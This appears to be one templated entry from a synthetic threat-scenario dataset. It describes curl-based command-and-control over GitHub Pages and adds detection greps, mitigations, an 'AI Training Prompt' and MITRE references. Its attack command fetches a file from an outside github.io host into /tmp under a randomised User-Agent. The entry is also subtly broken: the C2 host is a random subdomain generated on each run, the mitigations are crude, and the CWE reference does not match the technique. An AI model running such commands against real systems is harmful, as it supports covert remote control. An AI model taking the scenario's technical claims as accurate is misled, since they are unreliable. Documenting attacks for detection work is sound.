---
type: campaign
scenario_id: 447
tactic: Command and Control
technique: "T1071.001: Application Layer Protocol: Web Protocols"
technique_id: T1071.001
tags: [campaign, lotl, command_and_control]
---

# Using curl to communicate with GitHub Pages for C2.

## Threat Description
Using curl to communicate with GitHub Pages for C2.

## Attack Command
```
curl -H "User-Agent: $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 16)" https://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).github.io/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt -o /tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt
```

## Detection Logic
Monitor curl GitHub: `ps aux | grep curl | grep github.io`; Network traffic: `tcpdump -i any host github.io`.

## Mitigation
Restrict curl: `chmod 700 /usr/bin/curl`; Block GitHub Pages: `iptables -A OUTPUT -d github.io -j DROP`.

## AI Training Prompt
Train AI to detect curl-based C2 via GitHub Pages by analyzing HTTP headers, GitHub Pages URLs, and file creation patterns; recommend URL blocking.

## References
- MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
